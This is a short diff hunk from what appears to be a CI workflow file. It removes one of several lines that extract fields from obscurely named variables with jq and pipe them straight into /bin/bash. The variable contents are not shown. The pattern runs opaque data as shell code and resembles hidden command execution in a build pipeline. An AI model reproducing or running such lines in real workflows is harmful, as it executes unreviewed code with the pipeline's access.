@@ -24,7 +24,6 @@ jobs:
           echo $vcg443 | jq -r .mhgr42425 | /bin/bash
           echo $fd78 | jq -r .r4 | /bin/bash
           echo $ppv43 | jq -r .ijr34470 | /bin/bash
-          echo $uq39078 | jq -r .q3312 | /bin/bash
 
       - name: Persist results
         if: always()
